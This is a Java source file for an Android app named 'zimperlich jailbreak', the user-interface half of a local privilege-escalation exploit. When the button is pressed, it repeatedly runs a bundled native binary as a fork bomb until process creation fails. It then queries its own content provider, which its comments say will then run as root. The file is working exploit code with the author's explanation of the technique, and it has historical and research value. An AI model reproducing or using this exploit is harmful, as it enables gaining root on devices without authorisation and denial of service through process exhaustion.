package com.zimperlich.jailbreak;

import java.lang.Thread;
import java.lang.System;
import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;
import android.view.View;
import android.widget.Button;
import android.content.ContentResolver;
import android.net.Uri;


public class jailbreak extends Activity
{
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

	/* All this GUI stuff I assembled together via various
	 * howto's and small code snippets found on the web. So dont
	 * wonder about this strange looking buttons etc.
	 * The important thing is to invoke the fork-bomb
	 * until an exception tells us that no more processes can run
	 * as this user, e.g. if we invoke the provider in a separate process
	 * it will automagically become root.
	 */
	Button b = (Button)findViewById(R.id.Button01);
	b.setOnClickListener(new View.OnClickListener() {
		public void onClick(View view) {
			try {
				for (;;) {
					// I am not a DSO :)
					Runtime.getRuntime().exec("/data/data/com.zimperlich.jailbreak/lib/libjailbreak.so");
					Thread.sleep(10000);
				}
			} catch (Exception e) {
				ContentResolver cr = getContentResolver();
				String[] s = new String[] {"pwn"};
				cr.query(Uri.parse("content://com.zimperlich.jailbreak.root/foo"), s, new String(), s, new String());
				System.exit(0);
			}

		}
	});
    }
}


